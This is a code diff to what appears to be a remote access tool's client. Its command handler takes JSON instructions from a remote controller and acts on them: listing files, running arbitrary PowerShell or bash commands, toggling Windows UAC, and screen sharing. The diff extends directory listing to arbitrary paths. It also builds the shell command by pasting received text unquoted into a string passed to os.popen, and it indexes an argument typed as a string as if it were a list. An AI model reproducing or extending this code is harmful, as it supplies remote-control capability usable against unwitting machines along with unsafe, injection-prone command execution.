@@ -9,10 +9,10 @@ class CommandHandler:
     def handle(self, client, raw_data: str) -> None:
         try:
             data = json.loads(raw_data)
-            data = data.get("data")
-            match data:
+            cmd = data.get("data")
+            match cmd:
                 case "ls":
-                    self.handle_ls(client)
+                    self.handle_ls(client, data.get("arguments"))
                 case "exit":
                     client.close()
                     sys.exit(0)
@@ -21,7 +21,7 @@ class CommandHandler:
                 case "enableUac":
                     self.handle_enable_uac(client)
                 case "terminal":
-                    self.do_command(client, data.get("data"))
+                    self.do_command(client, data.get("arguments"))
                 case "ss":
                     screenshare.screenshare(client.send)
                 case _:
@@ -29,9 +29,19 @@ class CommandHandler:
         except json.JSONDecodeError as e:
             print(f"JSON decode error: {e}")
 
-    def handle_ls(self, client):
-        files = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isfile(os.path.join(os.path.expanduser("~"), f))]
-        folders = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isdir(os.path.join(os.path.expanduser("~"), f))]
+    def handle_ls(self, client, arguments: str = None):
+        if arguments is None:
+            arguments = [os.path.expanduser("~")]
+
+        if not os.path.exists(arguments[0]):
+            client.send(json.dumps({
+                "type": "command",
+                "json_data": f"Path does not exist: {arguments[0]}"
+            }))
+            return
+
+        files = [f for f in os.listdir(arguments[0]) if os.path.isfile(os.path.join(arguments[0], f))]
+        folders = [f for f in os.listdir(arguments[0]) if os.path.isdir(os.path.join(arguments[0], f))]
         client.send(json.dumps({
             "type": "command",
             "json_data": {
@@ -74,9 +84,27 @@ class CommandHandler:
                 "data": "UAC is already enabled"
             }))
 
-    def do_command(self, client, command: str):
-        output = os.popen(command).read()
-        client.send(json.dumps({
-            "type": "command",
-            "json_data": output
-        }))
+    def do_command(self, client, commands = None):
+        if commands is None:
+            client.send(json.dumps({
+                "type": "command",
+                "json_data": "No command provided"
+            }))
+            return
+
+        if os.name == "nt":
+            shell = "powershell"
+        else:
+            shell = "bash"
+
+        try:
+            output = os.popen(f"{shell} -c {commands}").read()
+            client.send(json.dumps({
+                "type": "command",
+                "json_data": output
+            }))
+        except Exception as e:
+            client.send(json.dumps({
+                "type": "command",
+                "json_data": f"Failed to execute command: {str(e)}"
+            }))
